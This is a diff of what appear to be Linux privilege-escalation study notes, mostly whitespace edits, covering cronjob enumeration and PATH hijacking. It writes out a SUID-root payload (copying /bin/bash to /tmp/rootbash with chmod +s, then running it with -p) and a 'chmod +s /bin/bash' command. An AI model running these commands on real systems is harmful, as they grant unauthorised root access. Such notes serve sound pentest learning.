@@ -206,14 +206,14 @@ User may run the following commands on x:
     git_set: "chmod +s /bin/bash"    
 
 ## Cronjobs    
-look for scripts you can write to running as a cronjob, writeable cron directory/crontab, writeable PATH directories used, wildcard expansion 
+look for scripts you can write to running as a cronjob, writeable cron directory/crontab, writeable PATH directories used, wildcard expansion       
 
-    cat /etc/crontab  
+    cat /etc/crontab   
     crontab -l    
-    ls -al /etc/cron* 
+    ls -al /etc/cron*    
 ### PATH variable      
 If a cronjob doesn’t use an absolute path and one of path dirs is writable by user: can create a script with the same name as the cron job so it is executed. 
-default /usr/bin:/bin 
+default /usr/bin:/bin         
 
     echo $PATH 
     cat /etc/crontab     
@@ -221,6 +221,8 @@ default /usr/bin:/bin
     #!/bin/bash 
     cp /bin/bash /tmp/rootbash 
     chmod +s /tmp/rootbash 
+
+    #then run /tmp/rootbash -p    
 ### RootPython Script    
 
     import os    
